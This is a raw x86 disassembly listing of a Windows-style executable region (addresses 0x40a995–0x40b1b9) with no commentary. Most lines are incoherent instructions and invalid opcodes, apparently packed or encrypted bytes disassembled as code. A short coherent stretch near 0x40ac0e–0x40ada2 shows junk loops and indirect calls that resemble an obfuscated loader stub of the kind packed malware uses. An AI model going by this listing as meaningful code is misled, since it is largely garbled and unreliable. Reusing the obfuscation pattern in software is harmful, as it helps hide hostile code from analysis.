  40a995:	rcl    DWORD PTR [esi],cl
  40a997:	fs jmp 0x819c2e1e
  40a99d:	xchg   esp,eax
  40a99e:	push   edi
  40a99f:	mov    ds:0x8d4227db,eax
  40a9a4:	dec    ecx
  40a9a5:	js     0x40a967
  40a9a7:	push   ebp
  40a9a8:	pop    eax
  40a9a9:	pop    edx
  40a9aa:	int    0x9b
  40a9ac:	sar    BYTE PTR [eax+0x7ba7b590],cl
  40a9b2:	push   es
  40a9b3:	sbb    BYTE PTR [esi+0x7b],dl
  40a9b6:	push   esi
  40a9b7:	iret   
  40a9b8:	test   DWORD PTR [ebx+0x4894a0a7],ebx
  40a9be:	xchg   esp,eax
  40a9bf:	adc    eax,0x90174369
  40a9c4:	jl     0x40aa33
  40a9c6:	mov    eax,ds:0xfa92e877
  40a9cb:	pop    ds
  40a9cc:	js     0x40a9a6
  40a9ce:	dec    edi
  40a9cf:	iret   
  40a9d0:	cmp    eax,0x9f34f4f6
  40a9d5:	fsub   QWORD PTR ss:[esi-0x35]
  40a9d9:	gs int 0xd5
  40a9dc:	sub    al,BYTE PTR [ebp+0x7238e108]
  40a9e2:	adc    ebp,DWORD PTR [ebx+0x71]
  40a9e5:	test   ebp,eax
  40a9e7:	mov    edx,0x5d785d05
  40a9ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9ed:	mov    ch,0xf4
  40a9ef:	and    ecx,DWORD PTR [edi+0x45]
  40a9f2:	adc    bh,BYTE PTR [ebp-0x3d]
  40a9f5:	push   ebp
  40a9f6:	shl    DWORD PTR [ecx-0x13647978],1
  40a9fc:	mov    edx,0xbf100f0b
  40aa01:	lahf   
  40aa02:	xor    DWORD PTR [edx],0xffffff8f
  40aa05:	cmp    al,0x7d
  40aa07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa08:	pop    esp
  40aa09:	mov    ah,0x67
  40aa0b:	inc    ecx
  40aa0c:	pop    ds
  40aa0d:	mov    edi,0x255b36dc
  40aa12:	push   ecx
  40aa13:	mov    dl,0xf8
  40aa15:	loope  0x40aa64
  40aa17:	imul   eax,DWORD PTR [esp+ebp*8+0x2a5fb4a2],0x51db6e73
  40aa22:	iret   
  40aa23:	cmp    eax,0x1fd01640
  40aa28:	xchg   edx,eax
  40aa29:	fwait
  40aa2a:	or     dl,BYTE PTR [edi-0x7b]
  40aa2d:	jl     0x40aa26
  40aa2f:	je     0x40a9db
  40aa31:	inc    ecx
  40aa32:	push   edi
  40aa33:	mov    bh,dl
  40aa35:	lock call DWORD PTR [eax-0x3dacbaf4]
  40aa3c:	stos   DWORD PTR es:[edi],eax
  40aa3d:	mov    eax,esi
  40aa3f:	sbb    BYTE PTR [edx+ebp*1+0x47],dl
  40aa43:	(bad)  ds:0x74e6c4ac
  40aa49:	cdq    
  40aa4a:	push   ebx
  40aa4b:	adc    al,0xa4
  40aa4d:	fisttp DWORD PTR [edx-0x3cffeaa3]
  40aa53:	sahf   
  40aa54:	mov    ecx,0xcdfde40c
  40aa59:	dec    edi
  40aa5a:	jb     0x40aa5e
  40aa5c:	scas   eax,DWORD PTR es:[edi]
  40aa5d:	(bad)  
  40aa5e:	stos   BYTE PTR es:[edi],al
  40aa5f:	dec    ecx
  40aa60:	in     eax,dx
  40aa61:	pop    ds
  40aa62:	push   ds
  40aa63:	data16 fcmovb st,st(6)
  40aa66:	idiv   edi
  40aa68:	mov    ecx,0x77c26148
  40aa6e:	push   esi
  40aa6f:	sbb    al,0x94
  40aa71:	inc    edi
  40aa72:	and    ch,BYTE PTR [ecx+ecx*8+0x54]
  40aa76:	mov    ebx,0x4f303d4d
  40aa7b:	rcl    BYTE PTR [eax],0x8e
  40aa7e:	stc    
  40aa7f:	add    eax,0x2c71a18b
  40aa84:	pop    ds
  40aa85:	mov    ch,0xc1
  40aa87:	and    esi,DWORD PTR [ecx-0x5]
  40aa8a:	clc    
  40aa8b:	(bad)  
  40aa8c:	xor    al,0xb4
  40aa8e:	mov    cl,dh
  40aa90:	retf   0x69f5
  40aa93:	dec    esi
  40aa94:	call   0x7a56:0xa6812274
  40aa9b:	(bad)  
  40aa9c:	stos   DWORD PTR es:[edi],eax
  40aa9d:	adc    eax,0xf04d41dc
  40aaa2:	lds    ecx,FWORD PTR [esp+ecx*1]
  40aaa5:	fwait
  40aaa6:	add    DWORD PTR [edi+edi*8+0x1b263e10],ecx
  40aaad:	popf   
  40aaae:	sti    
  40aaaf:	gs in  eax,dx
  40aab1:	or     eax,0x787b5255
  40aab6:	adc    dl,0xac
  40aab9:	adc    BYTE PTR [esi],bh
  40aabb:	push   eax
  40aabc:	leave  
  40aabd:	cmp    eax,0x97819221
  40aac2:	adc    al,BYTE PTR [edi-0x1fae7467]
  40aac8:	adc    BYTE PTR [ecx-0x4f],ch
  40aacb:	sti    
  40aacc:	js     0x40aac5
  40aace:	fbld   TBYTE PTR [edx+0x42e5b7e8]
  40aad4:	sbb    DWORD PTR [ebx-0x15c250af],ecx
  40aada:	mov    ds:0x4cefcc2c,eax
  40aadf:	inc    ebp
  40aae0:	(bad)
  40aae4:	dec    eax
  40aae5:	cs cmp esi,edi
  40aae8:	iret   
  40aae9:	sbb    al,0x57
  40aaeb:	bound  ebx,QWORD PTR [ecx+0x7e]
  40aaee:	fadd   st(7),st
  40aaf0:	shr    DWORD PTR [ebp+0x35],0x33
  40aaf4:	repz retf 0xc840
  40aaf8:	push   ebp
  40aaf9:	lods   eax,DWORD PTR ds:[esi]
  40aafa:	pop    edx
  40aafb:	pop    esi
  40aafc:	or     BYTE PTR [ebp-0x16e91c1c],ah
  40ab02:	aaa    
  40ab03:	ja     0x40aa9c
  40ab05:	scas   eax,DWORD PTR es:[edi]
  40ab06:	sub    dl,bl
  40ab08:	leave  
  40ab09:	cmp    BYTE PTR [ecx+edx*1],bh
  40ab0c:	xlat   BYTE PTR ds:[ebx]
  40ab0d:	mov    cs,WORD PTR [ecx-0x69]
  40ab10:	das    
  40ab11:	pop    edi
  40ab12:	or     ecx,eax
  40ab14:	loopne 0x40aafd
  40ab16:	pop    ebx
  40ab17:	sti    
  40ab18:	mov    ecx,0xf6e3bec6
  40ab1d:	test   BYTE PTR [ebx],cl
  40ab1f:	xchg   BYTE PTR [eax-0x34e6b823],dl
  40ab25:	mov    al,ds:0x6d47b1bc
  40ab2a:	daa    
  40ab2b:	pop    ecx
  40ab2c:	add    eax,DWORD PTR [eax+0x8f39f5]
  40ab32:	mov    WORD PTR [eax+0x1f],ss
  40ab35:	mov    ebx,0x8fe2e8b2
  40ab3a:	aad    0x26
  40ab3c:	sbb    eax,0x7cb73adc
  40ab41:	jge    0x40aba9
  40ab43:	adc    BYTE PTR [esi],bh
  40ab45:	lea    esi,[edx+0x6d]
  40ab48:	and    al,0x7a
  40ab4a:	and    al,BYTE PTR [ecx-0x1a96007b]
  40ab50:	stos   BYTE PTR es:[edi],al
  40ab51:	or     eax,0xc4059c16
  40ab56:	test   al,0xa8
  40ab58:	in     eax,dx
  40ab59:	inc    esi
  40ab5a:	push   eax
  40ab5b:	mov    ebx,0x5498cb75
  40ab60:	dec    ebx
  40ab61:	cmp    ch,BYTE PTR [edx+0x56134867]
  40ab67:	hlt    
  40ab68:	sbb    BYTE PTR [ecx+edi*1+0x67f43838],dh
  40ab6f:	fsub   st,st(5)
  40ab71:	idiv   BYTE PTR [esi]
  40ab73:	mov    eax,0xd09077fa
  40ab78:	jl     0x40ab3f
  40ab7a:	inc    BYTE PTR [esi]
  40ab7c:	mov    ?,WORD PTR [esi+ebx*8+0x713c3d2f]
  40ab83:	call   0x5e74:0xb983b112
  40ab8a:	sbb    edx,DWORD PTR [edi+ecx*2]
  40ab8d:	test   BYTE PTR [edx],0x8f
  40ab90:	dec    ebx
  40ab91:	cmp    al,0xb2
  40ab93:	arpl   WORD PTR [edi+eiz*4+0x72],si
  40ab97:	retf   0x27a6
  40ab9a:	lods   eax,DWORD PTR ds:[esi]
  40ab9b:	data16 (bad) [edi]
  40ab9e:	dec    edx
  40ab9f:	jg     0x40ab6c
  40aba1:	scas   al,BYTE PTR es:[edi]
  40aba2:	int    0x70
  40aba4:	int    0x8d
  40aba6:	push   eax
  40aba7:	pop    ss
  40aba8:	sbb    esi,edx
  40abaa:	xor    al,0xf8
  40abac:	retf   
  40abad:	jno    0x40aba8
  40abaf:	retf   
  40abb0:	aas    
  40abb1:	imul   esi,ecx,0xcc82fb9d
  40abb7:	out    0x99,al
  40abb9:	or     cl,bl
  40abbb:	and    BYTE PTR [edi+edi*8+0x32],al
  40abbf:	pop    esp
  40abc0:	aaa    
  40abc1:	mov    esp,0x4f3217c4
  40abc6:	push   esp
  40abc7:	cmp    al,0xfb
  40abc9:	sbb    al,0xa7
  40abcb:	in     eax,0x97
  40abcd:	adc    eax,0xc8bcdf0c
  40abd2:	or     al,0x85
  40abd4:	stc    
  40abd5:	mov    DWORD PTR [esi],0xca5f0c04
  40abdb:	into   
  40abdc:	jo     0x40abe4
  40abde:	inc    ebx
  40abdf:	cmp    DWORD PTR [ebx],ebx
  40abe1:	and    DWORD PTR [edi+0x4e4a742b],ecx
  40abe7:	push   cs
  40abe8:	pop    ebx
  40abe9:	adc    eax,0x60165c86
  40abee:	jmp    0x40abdf
  40abf0:	lds    esp,FWORD PTR [ebp+0x60]
  40abf3:	dec    ebx
  40abf4:	push   ecx
  40abf5:	inc    edi
  40abf6:	addr16 jg 0x40ac71
  40abf9:	push   ecx
  40abfa:	sbb    DWORD PTR [ecx],eax
  40abfc:	mov    ebp,0x330e9f67
  40ac01:	rol    BYTE PTR [ecx+0x42fdf535],1
  40ac07:	add    BYTE PTR [edi],cl
  40ac09:	call   0xd143ac50
  40ac0e:	mov    DWORD PTR ds:0x42e803,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fddd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fe7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fdf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e7f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e7f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e7f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e33d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e3f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e7f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e7f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e228,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e228
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e228,ebx
  40acad:	cmp    DWORD PTR ds:0x42e228,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e228,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e3f7
  40acd5:	cmp    DWORD PTR ds:0x42e228,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e228
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e228,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e234
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fde1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fde1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fde1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fe01
  40ad3c:	call   DWORD PTR ds:0x42e64b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fde1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fde1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ad62
  40adb4:	retf   
  40adb5:	ret    0x38e
  40adb8:	std    
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40adbd
  40adc0:	fld    TBYTE PTR [eax]
  40adc2:	push   ds
  40adc3:	in     eax,dx
  40adc4:	add    eax,0x26342d87
  40adc9:	sub    DWORD PTR [eax+ebp*1-0x7852206],eax
  40add0:	sub    ch,BYTE PTR [edi-0x333346f2]
  40add6:	dec    eax
  40add7:	add    DWORD PTR [edx-0x12b7879d],edi
  40addd:	pop    ds
  40adde:	xchg   ebx,eax
  40addf:	call   0xb45c:0x80af1a75
  40ade6:	fwait
  40ade7:	mov    dl,0x6a
  40ade9:	into   
  40adea:	ret    
  40adeb:	inc    ebx
  40adec:	retf   0x5bd1
  40adef:	cmp    DWORD PTR [ecx],esp
  40adf1:	loopne 0x40ae3e
  40adf3:	sbb    DWORD PTR [ebx+0x7be111a],ebp
  40adf9:	inc    edx
  40adfa:	js     0x40ae5e
  40adfc:	hlt    
  40adfd:	or     al,0xf2
  40adff:	pop    esp
  40ae00:	int3   
  40ae01:	sbb    eax,0xee650a64
  40ae06:	or     DWORD PTR [ebx-0x59],esp
  40ae09:	mov    dl,0xcc
  40ae0b:	push   ds
  40ae0c:	repnz mov DWORD PTR [ebp+0x6fbbe2b1],0x4808e69a
  40ae17:	sub    al,0x55
  40ae19:	cli    
  40ae1a:	fucom  st(4)
  40ae1c:	call   0x1df758db
  40ae21:	mov    bh,0xfa
  40ae23:	pop    edx
  40ae24:	bound  ecx,QWORD PTR [ebx+0x6a]
  40ae27:	mov    edi,0xa9e1bfd3
  40ae2c:	fcom   QWORD PTR [edx+0x643a9867]
  40ae32:	push   0x51f0b2a3
  40ae37:	dec    edx
  40ae38:	pop    es
  40ae39:	(bad)  
  40ae3a:	xor    BYTE PTR [ebp*8+0x12e5ea35],bl
  40ae41:	ja     0x40adf6
  40ae43:	xchg   edi,eax
  40ae44:	mov    edx,ebp
  40ae46:	mov    esp,0x1832e6bc
  40ae4b:	pop    es
  40ae4c:	out    0x49,eax
  40ae4e:	pop    edx
  40ae4f:	outs   dx,BYTE PTR ds:[esi]
  40ae50:	in     al,dx
  40ae51:	inc    edi
  40ae52:	and    DWORD PTR [ecx+0x31],ecx
  40ae55:	dec    edi
  40ae56:	and    ecx,DWORD PTR [eax+0x27]
  40ae59:	pop    es
  40ae5a:	and    DWORD PTR [eax+esi*8-0x78ca3cab],0x6ec47c9
  40ae65:	add    al,0xf7
  40ae67:	fs adc eax,0x8b947d83
  40ae6d:	mov    bh,0x11
  40ae6f:	xor    dl,dh
  40ae71:	fsub   st(6),st
  40ae73:	jle    0x40ae70
  40ae75:	jmp    0x40aeeb
  40ae77:	fisubr DWORD PTR [eax]
  40ae79:	sar    DWORD PTR [eax-0x671d5ff],0x15
  40ae80:	pop    ebp
  40ae81:	and    bl,BYTE PTR [ecx-0x7c]
  40ae84:	inc    ebp
  40ae85:	stc    
  40ae86:	jge    0x40af01
  40ae88:	jge    0x40aebb
  40ae8a:	add    eax,0x9ac7d219
  40ae8f:	pop    es
  40ae90:	inc    ebx
  40ae91:	adc    BYTE PTR ds:0xe554cb76,ch
  40ae97:	sbb    DWORD PTR [esp+ebx*4],0xad76dc55
  40ae9e:	pop    ecx
  40ae9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aea0:	pop    edi
  40aea1:	fwait
  40aea2:	mov    dl,0xd1
  40aea4:	pop    ss
  40aea5:	inc    eax
  40aea6:	xchg   ebp,eax
  40aea7:	adc    BYTE PTR [esp+esi*1],al
  40aeaa:	push   edx
  40aeab:	(bad)  
  40aeac:	cli    
  40aead:	mov    DWORD PTR ds:0x64739234,ebx
  40aeb3:	icebp  
  40aeb4:	ins    BYTE PTR es:[edi],dx
  40aeb5:	(bad)  
  40aeb6:	aaa    
  40aeb7:	xlat   BYTE PTR ds:[ebx]
  40aeb8:	mov    eax,ds:0xbcd974db
  40aebd:	pop    ds
  40aebe:	jge    0x40aead
  40aec0:	(bad)  
  40aec1:	pop    ebx
  40aec2:	sbb    al,0x4b
  40aec4:	jge    0x40af3c
  40aec6:	push   0x65ff04d3
  40aecb:	jmp    0xeef581f
  40aed0:	push   ss
  40aed1:	mov    edi,0x86c91d3a
  40aed6:	mov    ah,0x64
  40aed8:	add    DWORD PTR [esi+0xd5156a9],esp
  40aede:	in     al,dx
  40aedf:	ss inc edi
  40aee1:	sub    dl,bl
  40aee3:	pop    ds
  40aee4:	data16 mov ch,0x95
  40aee7:	jmp    0x40af51
  40aee9:	addr16 retf 0x6800
  40aeed:	js     0x40af1e
  40aeef:	push   0xff724a72
  40aef4:	sahf   
  40aef5:	outs   dx,DWORD PTR ds:[esi]
  40aef6:	pushf  
  40aef7:	sti    
  40aef8:	push   ebx
  40aef9:	test   DWORD PTR [eax-0x19],ebp
  40aefc:	adc    eax,0xd5ea2101
  40af01:	test   DWORD PTR [ebx+0x7d27134b],esp
  40af07:	imul   edi,edx,0x77
  40af0a:	mov    esi,0x27e03292
  40af0f:	les    ebx,FWORD PTR [edx]
  40af11:	cld    
  40af12:	lods   al,BYTE PTR ds:[esi]
  40af13:	xchg   esp,eax
  40af14:	test   DWORD PTR [ebx+0x54],esp
  40af17:	jl     0x40aee8
  40af19:	mov    ch,0x72
  40af1b:	(bad)  
  40af1c:	js     0x40af42
  40af1e:	add    ch,BYTE PTR [ebx-0x43c6369d]
  40af24:	jmp    0x2dbc:0x4201a806
  40af2b:	jmp    0xb081:0xb917ded7
  40af32:	mov    esi,0xf14020c
  40af37:	shl    DWORD PTR [edx-0x39],1
  40af3a:	test   eax,0x75035f5b
  40af3f:	mov    ebp,0xb953c237
  40af44:	lods   eax,DWORD PTR ds:[esi]
  40af45:	jl     0x40af4a
  40af47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af48:	aam    0x6a
  40af4a:	jnp    0x40af3e
  40af4c:	into   
  40af4d:	sub    al,0x66
  40af4f:	ja     0x40afcd
  40af51:	stos   BYTE PTR es:[edi],al
  40af52:	repnz dec eax
  40af54:	sbb    BYTE PTR [ecx+0x74c124ba],al
  40af5a:	loop   0x40af4c
  40af5c:	lods   eax,DWORD PTR ds:[esi]
  40af5d:	pushf  
  40af5e:	fnsave [edx]
  40af60:	sub    al,0x26
  40af62:	and    ecx,DWORD PTR [ecx]
  40af64:	adc    eax,0xb4f97f67
  40af69:	mov    ch,0xb
  40af6b:	aaa    
  40af6c:	mov    dh,BYTE PTR [esi+ebx*8+0x2baa424e]
  40af73:	mov    al,0x67
  40af75:	lds    edi,FWORD PTR [ebx-0x73188f7c]
  40af7b:	lods   eax,DWORD PTR ds:[esi]
  40af7c:	mov    ds:0xa8c1d68a,eax
  40af81:	add    ecx,DWORD PTR [eax]
  40af83:	out    0xb6,al
  40af85:	je     0x40afd0
  40af87:	mov    dl,0x98
  40af89:	ret    0xeba5
  40af8c:	or     al,0xa2
  40af8e:	sbb    ebx,0xd47e80c2
  40af94:	imul   ecx,DWORD PTR [ebx],0x751b9ae7
  40af9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af9b:	mov    dl,0x4e
  40af9d:	pcmpgtd mm1,mm3
  40afa0:	dec    edi
  40afa1:	mov    ch,0xc9
  40afa3:	jns    0x40b00d
  40afa5:	gs jb  0x40af38
  40afa8:	push   0xffffffc6
  40afaa:	mov    al,ds:0x73579a6a
  40afaf:	xor    ebp,DWORD PTR [edx+0x45ae0784]
  40afb5:	or     DWORD PTR [esi],esi
  40afb7:	sti    
  40afb8:	dec    ecx
  40afb9:	rcl    BYTE PTR [ecx+ebp*8-0x145c4d8c],0xeb
  40afc1:	inc    ebp
  40afc2:	add    eax,0xaa1da5c0
  40afc7:	pop    ss
  40afc8:	cs pop esi
  40afca:	stos   DWORD PTR es:[edi],eax
  40afcb:	dec    esi
  40afcc:	pop    ss
  40afcd:	imul   edx,esi,0x7e
  40afd0:	mov    ds:0x6f2a45c,al
  40afd5:	loopne 0x40b054
  40afd7:	aad    0xe7
  40afd9:	popf   
  40afda:	sar    dl,cl
  40afdc:	leave  
  40afdd:	int3   
  40afde:	test   eax,edx
  40afe0:	inc    edx
  40afe1:	loop   0x40b04d
  40afe3:	or     BYTE PTR [eax+0x6d4b83f9],ch
  40afe9:	and    al,0xa8
  40afeb:	neg    eax
  40afed:	mov    es,WORD PTR [edi+0x4b]
  40aff0:	stos   BYTE PTR es:[edi],al
  40aff1:	mov    BYTE PTR [esi+0x50],ch
  40aff4:	les    ebp,FWORD PTR [esi-0x7d]
  40aff7:	in     al,0xcb
  40aff9:	popf   
  40affa:	push   ebp
  40affb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40affc:	add    al,0x54
  40affe:	loop   0x40b050
  40b000:	xlat   BYTE PTR ds:[ebx]
  40b001:	ss inc ebp
  40b003:	or     eax,0x60f5bdfc
  40b008:	jle    0x40b008
  40b00a:	cmp    DWORD PTR [ebp-0x2e0fd27a],edx
  40b010:	xor    al,0xa1
  40b012:	dec    ebx
  40b013:	loop   0x40b00d
  40b015:	adc    al,0x5b
  40b017:	dec    edi
  40b018:	push   eax
  40b019:	out    0xe4,al
  40b01b:	sahf   
  40b01c:	das    
  40b01d:	jle    0x40b090
  40b01f:	(bad)  
  40b020:	mov    eax,0x5cfbde4f
  40b025:	je     0x40b031
  40b027:	xchg   ebp,eax
  40b028:	xchg   esi,eax
  40b029:	inc    eax
  40b02a:	test   DWORD PTR [eax],eax
  40b02c:	ret    0x9a8e
  40b02f:	xchg   ebp,eax
  40b030:	fwait
  40b031:	pop    ecx
  40b032:	retf   
  40b033:	jb     0x40afb5
  40b035:	dec    ebx
  40b036:	adc    DWORD PTR [ebp-0x4f],edi
  40b039:	push   eax
  40b03a:	cdq    
  40b03b:	mov    DWORD PTR [eax],edx
  40b03d:	push   0x955d27be
  40b042:	repz adc al,0x29
  40b045:	cwde   
  40b046:	and    al,0xed
  40b048:	xor    dh,BYTE PTR [edi-0x7b]
  40b04b:	call   0xf876567c
  40b050:	mov    ebx,0x4672fbd
  40b055:	push   ecx
  40b056:	jns    0x40b04a
  40b058:	lahf   
  40b059:	fldcw  WORD PTR [ebx+eax*4-0x6cbb4f4c]
  40b060:	call   0xe9628715
  40b065:	daa    
  40b066:	jg     0x40b051
  40b068:	add    al,0xe8
  40b06a:	outs   dx,DWORD PTR ds:[esi]
  40b06b:	cdq    
  40b06c:	pop    esp
  40b06d:	cli    
  40b06e:	mov    ch,0x28
  40b070:	in     al,dx
  40b071:	xor    cl,dh
  40b073:	sub    BYTE PTR [esi+ecx*4],dh
  40b076:	adc    DWORD PTR [ebx+0x305e5ee1],ebx
  40b07c:	jg     0x40b0cd
  40b07e:	call   0x75dc:0xe33ee82
  40b085:	lods   eax,DWORD PTR ds:[esi]
  40b086:	loop   0x40b0cd
  40b088:	out    0xdc,al
  40b08a:	pop    eax
  40b08b:	push   esi
  40b08c:	lock sbb eax,0x9f47217a
  40b092:	push   esp
  40b093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b094:	sbb    eax,0x9dd8be9b
  40b099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b09a:	scas   eax,DWORD PTR es:[edi]
  40b09b:	repnz mov esi,cs
  40b09e:	ret    0x3a8f
  40b0a1:	or     esi,ebx
  40b0a3:	stos   BYTE PTR es:[edi],al
  40b0a4:	mov    DWORD PTR [eax-0x6f09f97d],esp
  40b0aa:	or     DWORD PTR [eax],eax
  40b0ac:	aaa    
  40b0ad:	xchg   ecx,eax
  40b0ae:	pop    ecx
  40b0af:	inc    ebp
  40b0b0:	dec    esp
  40b0b1:	sub    BYTE PTR [esi-0x91f9b7d],0xb7
  40b0b8:	and    BYTE PTR [eax-0x56],bl
  40b0bb:	add    BYTE PTR ds:0x1120ea69,cl
  40b0c1:	daa    
  40b0c2:	hlt    
  40b0c3:	inc    eax
  40b0c4:	aaa    
  40b0c5:	dec    esp
  40b0c6:	clc    
  40b0c7:	clc    
  40b0c8:	mov    eax,ds:0xda7bef9b
  40b0cd:	adc    al,0xbe
  40b0cf:	inc    esi
  40b0d0:	cwde   
  40b0d1:	leave  
  40b0d2:	fidivr WORD PTR [ebp+0x38a6952e]
  40b0d8:	into   
  40b0d9:	call   0x3414fd33
  40b0de:	jo     0x40b06e
  40b0e0:	dec    edx
  40b0e1:	xor    al,0x13
  40b0e3:	jns    0x40b0de
  40b0e5:	hlt    
  40b0e6:	sbb    al,0x96
  40b0e8:	add    edi,DWORD PTR [eax-0x21f9ecb3]
  40b0ee:	xor    bh,cl
  40b0f0:	mov    cl,0x4
  40b0f2:	retf   
  40b0f3:	(bad)  
  40b0f4:	dec    ecx
  40b0f5:	jmp    0xda2c:0x9600bfe2
  40b0fc:	loop   0x40b0be
  40b0fe:	not    ah
  40b100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b101:	push   esi
  40b102:	cmc    
  40b103:	inc    ebx
  40b104:	sub    edx,ebp
  40b106:	and    eax,0xad4990c3
  40b10b:	dec    ebp
  40b10c:	pop    eax
  40b10d:	(bad)  
  40b10e:	(bad)  
  40b10f:	popf   
  40b110:	jmp    0x4673a753
  40b115:	push   es
  40b116:	push   0xffffff98
  40b118:	les    esp,FWORD PTR [edx+0x260e8bc3]
  40b11e:	adc    bl,BYTE PTR [ebp-0xac99910]
  40b124:	fild   WORD PTR [edi]
  40b126:	pop    ds
  40b127:	xchg   esp,eax
  40b128:	dec    eax
  40b129:	retf   
  40b12a:	sahf   
  40b12b:	mov    ebx,0x4893f7cd
  40b130:	ss add eax,ecx
  40b133:	mov    eax,ds:0x30f41f3
  40b138:	icebp  
  40b139:	scas   al,BYTE PTR es:[edi]
  40b13a:	pusha  
  40b13b:	inc    esp
  40b13c:	or     eax,0xa0bb382c
  40b141:	pop    edi
  40b142:	pop    esp
  40b143:	add    al,0xa6
  40b145:	fsubr  QWORD PTR [eax]
  40b147:	mov    ds:0xe0c3f86f,eax
  40b14c:	jno    0x40b160
  40b14e:	and    al,0xb3
  40b150:	out    0x4,al
  40b152:	mov    ah,BYTE PTR [ecx+0x19]
  40b155:	test   al,0xe6
  40b157:	mov    eax,ds:0x9275990a
  40b15c:	shl    DWORD PTR [ecx-0x2efcc72c],0xe9
  40b163:	mov    ecx,0xd2000003
  40b168:	jne    0x40b1a1
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	and    al,0x3a
  40b175:	lock sti 
  40b177:	mov    ds:0x9f7070fa,al
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b11d
  40b180:	pop    esi
  40b181:	push   ds
  40b182:	cdq    
  40b183:	pop    ds
  40b184:	ror    BYTE PTR [esi],cl
  40b186:	pop    ebp
  40b187:	mov    WORD PTR [esi-0x68538ccb],?
  40b18d:	mov    bl,0x9
  40b18f:	rdmsr  
  40b191:	inc    eax
  40b192:	push   0x9a0cc879
  40b197:	xor    al,0xd9
  40b199:	in     eax,0xb6
  40b19b:	data16 icebp 
  40b19d:	xchg   esi,eax
  40b19e:	push   ss
  40b19f:	pop    ebx
  40b1a0:	jno    0x40b212
  40b1a2:	adc    DWORD PTR [ebx],ebp
  40b1a4:	es mov edx,0x80320a27
  40b1aa:	call   0x82f8e11f
  40b1af:	cmp    bl,BYTE PTR [eax-0x54]
  40b1b2:	icebp  
  40b1b3:	xchg   BYTE PTR ds:0xf857d45c,al
  40b1b9:	outs   dx,DWORD PTR ds:[esi]
